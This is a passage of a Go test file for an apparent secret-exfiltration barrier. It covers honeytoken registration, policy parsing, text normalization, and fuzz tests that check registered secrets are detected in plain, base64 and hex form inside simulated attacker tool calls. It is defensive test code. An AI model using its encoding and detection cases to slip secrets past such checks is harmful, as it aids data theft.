		v, _ := GenerateHoneytoken(KindGenericAPIKey)
		if _, err := r.reg.Register("secret", "", v+fmt.Sprint(i)); err != nil {
			t.Fatal(err)
		}
	}
	text := strings.Repeat("The quick brown fox jumps over the lazy dog. Release notes for version 5.12 are ready. ", 400)
	if v := r.check(t, attacker(text)); !v.Allowed || v.Reason != ReasonNoMatch {
		t.Fatalf("%+v", v)
	}
}

func TestPolicyParsing(t *testing.T) {
	bad := map[string]string{
		"empty":             ``,
		"wrong version":     `{"version":2,"labels":{}}`,
		"unknown field":     `{"version":1,"labels":{},"allow":"*"}`,
		"unknown label key": `{"version":1,"labels":{"secret":{"allow_host":["a.example"]}}}`,
		"two documents":     `{"version":1,"labels":{}} {"version":1,"labels":{}}`,
		"bad mode":          `{"version":1,"mode":"dry","labels":{}}`,
		"bad label":         `{"version":1,"labels":{"Bad Label":{}}}`,
		"star host":         `{"version":1,"labels":{"secret":{"allow_hosts":["*"]}}}`,
		"url as host":       `{"version":1,"labels":{"secret":{"allow_hosts":["https://a.example"]}}}`,
		"mid wildcard":      `{"version":1,"labels":{"secret":{"allow_hosts":["a.*.example"]}}}`,
		"host with path":    `{"version":1,"labels":{"secret":{"allow_hosts":["a.example/x"]}}}`,
		"relative path":     `{"version":1,"labels":{"secret":{"allow_paths":["tmp/x"]}}}`,
		"dot dot path":      `{"version":1,"labels":{"secret":{"allow_paths":["/tmp/../x"]}}}`,
		"wildcard path":     `{"version":1,"labels":{"secret":{"allow_paths":["/tmp/*"]}}}`,
		"star tool":         `{"version":1,"labels":{"secret":{"allow_tools":["*"]}}}`,
	}
	for name, doc := range bad {
		if _, err := ParsePolicy([]byte(doc)); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
	p, err := ParsePolicy([]byte(`{"version":1,"labels":{"secret":{}}}`))
	if err != nil {
		t.Fatal(err)
	}
	if len(p.Labels["secret"].AllowHosts) != 0 {
		t.Fatal("an empty label policy must allow nothing")
	}
}

func TestNormalizeTable(t *testing.T) {
	cases := map[string]string{
		"":                   "",
		"AbC dEf":            "abcdef",
		" a\tb\nc\r\nd ":     "abcd",
		"a\u200bb\ufeffc":    "abc",
		"a\u00adb":           "ab",
		"\u00a0x\u2003y":     "xy",
		"bad\xffbyte":        "bad\xffbyte",
		"ÀÉ":                 "àé",
		"\xe2\x82 truncated": "\xe2\x82truncated",
	}
	for in, want := range cases {
		if got := Normalize(in); got != want {
			t.Errorf("Normalize(%q) = %q, want %q", in, got, want)
		}
	}
}

func FuzzNormalize(f *testing.F) {
	for _, s := range []string{"", "abc", "A b\tC", "a\u200bb", "\xff\xfe", "İstanbul", "ǅ", "\u00ad", "ß SS", "\xe2\xe2\xe2\xe2 \x80\x8b0"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		n := Normalize(s)
		if Normalize(n) != n {
			t.Fatalf("not idempotent: %q -> %q -> %q", s, n, Normalize(n))
		}
		for _, r := range n {
			if r == ' ' || r == '\n' || r == '\t' || r == '\r' || r == '\u200b' || r == '\ufeff' {
				t.Fatalf("separator left in %q", n)
			}
		}
		if len(n) > len(s)*4 {
			t.Fatalf("output grew too much")
		}
	})
}

// FuzzScanFindsRegisteredValue checks the property the barrier depends on: a
// registered value is found when it appears in surrounding noise, in plain
// form and in base64 and hex.
func FuzzScanFindsRegisteredValue(f *testing.F) {
	f.Add("fixture-value-12345", "noise before", "noise after")
	f.Add("ünïcödé-välue-9999", "x", "y")
	f.Add("\xff\xfe\xfd\xfc\xfb\xfa\xf9\xf8\xf7", "", "")
	f.Add("secret\xe2\xe2\xe2value", "\xe2\xe2", "\x80\x8b")
	f.Fuzz(func(t *testing.T, secret, pre, post string) {
		reg, err := NewRegistryWithKey([]byte("0123456789abcdef0123456789abcdef"))
		if err != nil {
			t.Fatal(err)
		}
		if _, err := reg.Register("secret", "k", secret); err != nil {
			return // too short, too long: refused, nothing to find
		}
		if len(reg.Scan(pre+"\n"+secret+"\n"+post)) != 1 {
			t.Fatalf("plain value not found")
		}
		b64 := base64.StdEncoding.EncodeToString([]byte(pre + secret + post))
		if len(reg.Scan(b64)) != 1 {
			t.Fatalf("base64 value not found")
		}
		if len(reg.Scan(hex.EncodeToString([]byte(pre+secret+post)))) != 1 {
			t.Fatalf("hex value not found")
		}
	})
}

func BenchmarkCheck4KiB(b *testing.B) {
	r := newRig(b, testPolicy, ModeEnforce)
	for i := 0; i < 20; i++ {
		_, _ = r.reg.Register("secret", "", fmt.Sprintf("bench-secret-%03d-0123456789abcdefghij", i))
	}
	call := attacker(strings.Repeat("ordinary text with no secret in it ", 120))
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		if _, err := r.b.Check(context.Background(), call); err != nil {
			b.Fatal(err)
		}
	}
}
